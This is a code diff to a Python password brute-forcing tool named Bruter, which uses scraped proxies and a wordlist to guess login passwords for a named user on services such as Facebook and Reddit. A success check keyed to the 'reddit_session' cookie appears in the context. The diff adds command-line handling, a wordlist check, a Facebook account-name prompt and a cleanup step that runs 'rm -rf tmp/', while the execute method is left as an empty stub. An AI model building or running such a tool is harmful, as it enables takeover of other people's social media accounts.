@@ -2,6 +2,7 @@ from proxyscrape import create_collector, get_collector
 import time
 import requests
 import argparse
+import os
 
 avoidance_patterns = [
     r"^[0-9]+$",  # Avoid using all numeric passwords
@@ -59,6 +60,8 @@ class Bruter:
                 'success': lambda r: 'reddit_session' in r.cookies
             }
         }
+    def execute(self):
+        pass
 
 def main():
     parser = argparse.ArgumentParser(
@@ -74,4 +77,29 @@ def main():
     parser.add_argument("-v", "--verbose", action="store_true",
                         help="Show detailed output for each attempt")
 
-    
+    args = parser.parse_args()
+
+    service = args.service
+    username = args.username
+    wordlist = args.password
+    delay = args.delay or 1
+    fb_name = None
+
+    if not os.path.exists(wordlist):
+        print("[Error] Wordlist not found")
+        exit(1)
+
+    if service == "facebook":
+        fb_name = input("Please Enter the Name of the Facebook Account: ")
+        os.system("clear")
+
+    br = Bruter(service, username, wordlist, delay, fb_name=fb_name, verbose=args.verbose)
+    br.execute()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n\033[91m[!] Operation cancelled by user\033[0m")
+        os.system("rm -rf tmp/")
+        exit(1)
